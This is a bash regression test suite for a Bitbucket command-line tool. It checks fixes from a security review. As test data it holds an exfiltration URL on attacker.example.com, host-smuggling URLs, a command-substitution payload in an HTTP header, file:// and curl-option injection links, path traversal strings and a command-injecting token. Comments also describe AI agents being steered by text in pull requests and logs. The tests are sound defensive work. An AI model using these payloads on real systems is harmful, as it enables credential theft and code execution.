#!/usr/bin/env bash
#
# Regression tests for the findings of the 2026-08 security review.
#
# Each case here corresponds to a vulnerability that was real and reproducible,
# not a hypothetical. They exist because the same mistakes are easy to reinstate:
# "just let a full URL through" and "just compare the status code" both look
# harmless in a diff.
#
# Run: tests/security_test.sh
set -u

# shellcheck source=tests/lib/fake_curl.sh
. "$(dirname "${BASH_SOURCE[0]}")/lib/fake_curl.sh"
harness_init

export HOME="$TMP/home"
mkdir -p "$HOME/.config/bb-cli"

REPO_DIR="$TMP/checkout"
mkdir -p "$REPO_DIR"
git -C "$REPO_DIR" init -q
git -C "$REPO_DIR" remote add origin git@bitbucket.org:myworkspace/myrepo.git
cd "$REPO_DIR"

echo "security tests"

# --- F1: credential exfiltration through the endpoint argument --------------
# `bb-cli api` attaches the user's token to whatever URL it is handed. Without a
# host allow-list, one command sends that token anywhere. This matters more than
# it sounds: SKILL.md tells agents to reach for `bb-cli api`, and agents read
# pull request bodies and pipeline logs that other people wrote.

run_bb api "https://attacker.example.com/collect"
assert_eq "1" "$BB_RC" "a non-Bitbucket https host is refused"
assert_not_contains "attacker.example.com" "$CURL_CALLS" "no request is made to it"
assert_contains "refusing to send Bitbucket credentials" "$BB_OUT" "the refusal says why"

run_bb api "http://api.bitbucket.org/2.0/user"
assert_eq "1" "$BB_RC" "plaintext http is refused even for the right host"
assert_not_contains "api.bitbucket.org" "$CURL_CALLS" "no plaintext request is made"

# Userinfo and port must not be usable to smuggle the host past the check.
run_bb api "https://api.bitbucket.org@attacker.example.com/x"
assert_eq "1" "$BB_RC" "user@host cannot disguise the real host"
assert_not_contains "attacker.example.com" "$CURL_CALLS" "and makes no request"

run_bb api "https://api.bitbucket.org.attacker.example.com/x"
assert_eq "1" "$BB_RC" "a suffixed lookalike host is refused"

# The legitimate case still works.
run_bb api "https://api.bitbucket.org/2.0/repositories/myworkspace/myrepo"
assert_eq "0" "$BB_RC" "a real Bitbucket URL still passes through"
assert_contains "api.bitbucket.org" "$CURL_CALLS" "and reaches the network layer"

# --- F2: remote code execution through the HTTP status code -----------------
# `[[ $x -ge 400 ]]` evaluates x as a bash arithmetic expression, and inside one
# an array subscript runs command substitution. API_STATUS is parsed out of
# response headers, so a hostile server could execute shell commands. awk strips
# leading whitespace when splitting fields, so an indented continuation line
# beginning "HTTP/" used to be read as a status line.

PROOF="$TMP/rce-proof"
rm -f "$PROOF"

cp "$TMP/curl" "$TMP/curl.wellbehaved"
cat > "$TMP/curl" <<FAKE
#!/usr/bin/env bash
echo "\$@" >> "\$CURL_LOG"
hdr=""; out=""; prev=""
for a in "\$@"; do
  [[ "\$prev" == "-D" ]] && hdr="\$a"
  [[ "\$prev" == "-o" ]] && out="\$a"
  prev="\$a"
done
if [[ -n "\$hdr" ]]; then
  {
    printf 'HTTP/1.1 200 OK\r\n'
    printf 'X-Foo: bar\r\n'
    printf '\tHTTP/1.1 a[\$(touch${IFS}${PROOF})] x\r\n'
    printf '\r\n'
  } > "\$hdr"
fi
[[ -n "\$out" ]] && echo '{"ok":true}' > "\$out" || echo '{"ok":true}'
FAKE
chmod +x "$TMP/curl"

run_bb api "repositories/:repo"
if [[ -e "$PROOF" ]]; then
    echo "  FAIL - a response header executed a shell command (RCE)"
    fail=$((fail + 1))
    rm -f "$PROOF"
else
    echo "  ok   - a hostile status line in a response header executes nothing"
    pass=$((pass + 1))
fi
assert_eq "0" "$BB_RC" "and the request is still treated as the 200 it really was"

# Restore the well-behaved fake curl for the remaining cases.
cp "$TMP/curl.wellbehaved" "$TMP/curl"
echo '{"ok":true}' > "$CURL_BODY"

# --- F3: --paginate followed a server-controlled URL ------------------------
# `.next` is chosen by whoever answers. curl's default protocol set includes
# file://, and because the URL is curl's last argument, a value starting with
# "-" is parsed as an option (-K reads an arbitrary curl config).

SECRET="$TMP/secret.txt"
echo "TOP SECRET LOCAL FILE" > "$SECRET"

echo "{\"values\":[{\"a\":1}],\"next\":\"file://${SECRET}\"}" > "$CURL_BODY"
run_bb api "repositories/:repo/pullrequests" --paginate
assert_not_contains "TOP SECRET" "$BB_OUT" "a file:// next link does not read a local file"
assert_contains "non-https" "$BB_OUT" "and it says it ignored the link"

echo '{"values":[{"a":1}],"next":"https://attacker.example.com/page2"}' > "$CURL_BODY"
run_bb api "repositories/:repo/pullrequests" --paginate
assert_not_contains "attacker.example.com" "$CURL_CALLS" "a cross-host next link is not followed"
assert_contains "cross-host" "$BB_OUT" "and it says so"

echo '{"values":[{"a":1}],"next":"-K/tmp/evil.conf"}' > "$CURL_BODY"
run_bb api "repositories/:repo/pullrequests" --paginate
assert_not_contains "evil.conf" "$CURL_CALLS" "a next link shaped like a curl option is not passed to curl"

echo '{"values":[{"a":1}]}' > "$CURL_BODY"

# --- protocol restriction ---------------------------------------------------

run_bb api "repositories/:repo"
assert_contains "--proto =https" "$CURL_CALLS" "curl is restricted to https"
assert_contains "--proto-redir =https" "$CURL_CALLS" "and redirects cannot downgrade to http"

# --- F4: the credential must not be on the command line ---------------------
# argv is readable by any process of the same user, and on Linux by any local
# user via /proc/<pid>/cmdline. It also lands in audit logs and in `bash -x`.

run_bb api "repositories/:repo"
assert_not_contains "test-token" "$CURL_CALLS" "the token is not in curl's argv"
assert_contains "-K -" "$CURL_CALLS" "it is fed to curl on stdin as a config"

run_bb pr 10 2>/dev/null
assert_not_contains "test-token" "$CURL_CALLS" "the older code paths do not expose it either"

# --- F8: bb-cli docs path traversal ----------------------------------------
# `docs` looks harmless, which is exactly why an agent would run it with any
# argument it was handed.

run_bb docs "../../../../../../$TMP/secret"
assert_eq "1" "$BB_RC" "a traversing doc name is refused"
assert_not_contains "TOP SECRET" "$BB_OUT" "and reads nothing"
assert_contains "invalid doc name" "$BB_OUT" "the refusal names the problem"

run_bb docs ".hidden"
assert_eq "1" "$BB_RC" "a dot-prefixed doc name is refused"

run_bb docs scopes
assert_eq "0" "$BB_RC" "a real topic still works"

# --- F7: temp files are cleaned up -----------------------------------------

before=$(find "${TMPDIR:-/tmp}" -maxdepth 1 -name 'bb-cli-*' 2>/dev/null | wc -l | tr -d ' ')
run_bb api "repositories/:repo"
run_bb api "repositories/:repo/pullrequests" --paginate
after=$(find "${TMPDIR:-/tmp}" -maxdepth 1 -name 'bb-cli-*' 2>/dev/null | wc -l | tr -d ' ')
assert_eq "$before" "$after" "requests leave no temp files behind"

# A page that is not valid JSON used to abort under set -e before any cleanup,
# printing nothing at all to either stream.
echo 'not json at all' > "$CURL_BODY"
run_bb api "repositories/:repo/pullrequests" --paginate
leaked=$(find "${TMPDIR:-/tmp}" -maxdepth 1 -name 'bb-cli-*' 2>/dev/null | wc -l | tr -d ' ')
assert_eq "$before" "$leaked" "a malformed page leaves no temp files behind either"
echo '{"ok":true}' > "$CURL_BODY"

# --- F5: upgrade must not act on an enclosing repository --------------------
# rev-parse --is-inside-work-tree walks up, so a bb-cli copied inside someone
# else's checkout would have git-pulled THEIR repository. Upgrade now falls back
# to replacing the single script, which must still never touch that repository.

OUTER="$TMP/outer"
mkdir -p "$OUTER/vendor/bb-cli/bin" "$OUTER/vendor/bb-cli/docs"
git -C "$OUTER" init -q
git -C "$OUTER" -c user.email=t@t -c user.name=t commit -q --allow-empty -m "outer repo"
cp "$BBCLI" "$OUTER/vendor/bb-cli/bin/bb-cli"
OUTER_HEAD_BEFORE="$(git -C "$OUTER" rev-parse HEAD)"
set +e
NESTED_OUT="$(CURL_BODY="$BBCLI" "$OUTER/vendor/bb-cli/bin/bb-cli" upgrade 2>&1)"
NESTED_RC=$?
set -e
assert_eq "0" "$NESTED_RC" "upgrade treats a nested copy as a single-file install"
assert_contains "single file, no checkout" "$NESTED_OUT" \
    "and says so rather than pulling the enclosing repo"
assert_eq "$OUTER_HEAD_BEFORE" "$(git -C "$OUTER" rev-parse HEAD)" \
    "the enclosing repository was not touched"
assert_eq "" "$(git -C "$OUTER" status --porcelain -- . ':!vendor')" \
    "and nothing outside the vendored script was modified"

# --- F9: the credentials file is not a shell injection vector ---------------
# The file is sourced on every run, so a token containing $( would execute.

PROOF2="$TMP/creds-proof"
rm -f "$PROOF2"
printf 'BITBUCKET_USERNAME=%q\n' 'user@example.com' > "$HOME/.config/bb-cli/credentials"
printf 'BITBUCKET_API_TOKEN=%q\n' 'tok"$(touch '"$PROOF2"')"' >> "$HOME/.config/bb-cli/credentials"
set +e
( unset BITBUCKET_USERNAME BITBUCKET_API_TOKEN; HOME="$HOME" "$BBCLI" version > /dev/null 2>&1 )
set -e
if [[ -e "$PROOF2" ]]; then
    echo "  FAIL - a token in the credentials file executed a command"
    fail=$((fail + 1))
else
    echo "  ok   - a %q-quoted token cannot execute when the file is sourced"
    pass=$((pass + 1))
fi

summary
